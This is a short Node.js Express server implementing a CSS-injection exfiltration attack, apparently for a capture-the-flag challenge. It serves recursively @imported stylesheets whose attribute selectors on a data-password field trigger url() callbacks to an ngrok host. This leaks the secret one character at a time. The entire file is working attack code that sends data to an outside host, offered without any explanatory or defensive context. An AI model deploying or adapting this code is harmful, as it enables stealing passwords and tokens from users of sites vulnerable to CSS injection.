const express = require("express");

const app = express();

const REMOTE = "https://c50e-109-156-209-195.ngrok-free.app";
const CHARSET = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}";

globalThis.curr = "uiu";
globalThis.stopWaiting = null;
globalThis.n = 1;

app.use("/", express.static("."));

app.get("/style.css", async (req, res) => {
	await new Promise(r => globalThis.stopWaiting = r);

	let sheet = `@import '${REMOTE}/style.css?${Math.random()}';`;

	for (let c of CHARSET) {
		// the repeat is for css specificity to make the new style apply over the old one
		sheet += ` :root:has(${`[data-password^="${curr}${c}"]`.repeat(n)}) { --lol: url('${REMOTE}/cb?curr=${curr}${c}'); } `;
	}

	return res.end(sheet);
})

app.get("/cb", async (req, res) => {
	await new Promise(r => setTimeout(r, 300));
	globalThis.curr = req.query.curr;
	console.log(globalThis.curr);
	globalThis.stopWaiting();
	globalThis.stopWaiting = null;
	globalThis.n++;
	return res.end("lmao");
})

app.listen(5050, () => console.log("listening"));
